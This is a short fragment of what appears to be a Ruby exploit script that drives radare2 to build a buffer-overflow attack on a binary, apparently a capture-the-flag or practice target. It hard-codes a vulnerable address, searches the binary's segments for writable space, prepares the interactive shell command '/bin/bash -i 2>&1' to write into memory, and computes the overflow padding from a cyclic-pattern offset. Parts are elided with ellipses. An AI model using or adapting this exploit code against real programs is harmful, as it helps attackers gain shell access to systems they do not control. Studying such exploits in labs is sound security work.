...
# this is hard coded in... r2 isnt magic
vuln_addr = 0x080483F4

# find a place to write
segments = JSON.parse(r2pbin.cmd("iSj"))
command = "/bin/bash -i 2>&1"
target_size = command.size + 1 # big enough for our command to write in
...
padding_len = r2pbin.cmd("woO 0x41417641").to_i  # found this already in debugger
